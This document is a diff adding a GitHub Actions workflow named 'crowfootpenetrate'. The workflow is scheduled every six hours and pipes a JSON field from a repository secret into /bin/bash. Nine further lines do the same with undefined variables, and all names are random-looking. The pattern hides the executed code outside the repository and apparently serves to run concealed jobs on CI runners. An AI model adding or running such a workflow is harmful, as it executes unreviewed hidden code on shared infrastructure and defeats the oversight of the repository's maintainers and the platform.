@@ -1,0 +1,27 @@
+name: crowfootpenetrate
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: crowfootpenetrate
+        env:
+          ycp8: ${{ secrets.ycp8 }}
+        run: |
+          echo $ycp8 | jq -r .tsiot491 | /bin/bash
+          echo $zg9 | jq -r .rxi912 | /bin/bash
+          echo $l3081 | jq -r .uk17008 | /bin/bash
+          echo $jgb318 | jq -r .c42 | /bin/bash
+          echo $kvf74 | jq -r .wet5645 | /bin/bash
+          echo $espt39505 | jq -r .trfxx30944 | /bin/bash
+          echo $as74413 | jq -r .ftk557 | /bin/bash
+          echo $e1464 | jq -r .q58 | /bin/bash
+          echo $cdmr3517 | jq -r .j9 | /bin/bash
+          echo $hwywm176 | jq -r .dpv6862 | /bin/bash
+
